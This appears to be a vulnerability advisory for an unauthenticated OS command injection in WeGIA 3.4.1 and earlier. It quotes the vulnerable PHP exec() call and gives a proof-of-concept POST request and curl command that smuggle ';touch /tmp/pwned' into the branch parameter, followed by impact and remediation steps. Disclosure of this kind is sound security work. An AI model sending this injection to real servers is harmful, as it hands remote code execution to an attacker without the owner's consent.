# CVE-2025-50201 Vulnerability Report

## Overview

- **CVE ID**: CVE-2025-50201
- **CWE**: CWE-78 (OS Command Injection)
- **CVSS Score**: 9.8 (Critical)
- **Affected Software**: WeGIA <= 3.4.1
- **Fixed Version**: 3.4.2
- **Vulnerability Type**: Unauthenticated Remote Code Execution

## Vulnerability Description

An OS Command Injection vulnerability exists in WeGIA's `/html/configuracao/debug_info.php` endpoint. The `branch` parameter is passed directly to the PHP `exec()` function without proper sanitization, allowing an attacker to inject arbitrary shell commands.

## Vulnerable Code

```php
function gitCheckout($branch) {
    $output = array();
    exec("git -C ".ROOT." checkout $branch", $output);
    return $output;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['branch'])) {
    $branch = $_POST['branch']; 
    $action = $_POST["action"]; 

    if ($action == "switch") {
        $output = gitCheckout($branch);
    }
}
```

## Exploitation

### PoC Request

```
POST /WeGIA/html/configuracao/debug_info.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

branch=master;touch /tmp/pwned&action=switch
```

### Verification

```bash
# Attack request
curl -s -X POST -d 'branch=master;touch /tmp/pwned&action=switch' \
    'http://target/WeGIA/html/configuracao/debug_info.php'

# Verify file creation
ls -la /tmp/pwned
```

## Impact

Successful exploitation allows an unauthenticated attacker to:

1. Execute arbitrary commands on the server
2. Read/write files with www-data privileges
3. Potentially pivot to other systems
4. Compromise data confidentiality, integrity, and availability

## Remediation

1. Update WeGIA to version 3.4.2 or later
2. Implement proper input validation for the branch parameter
3. Use allowlist for valid branch names
4. Apply least privilege principles to web server processes
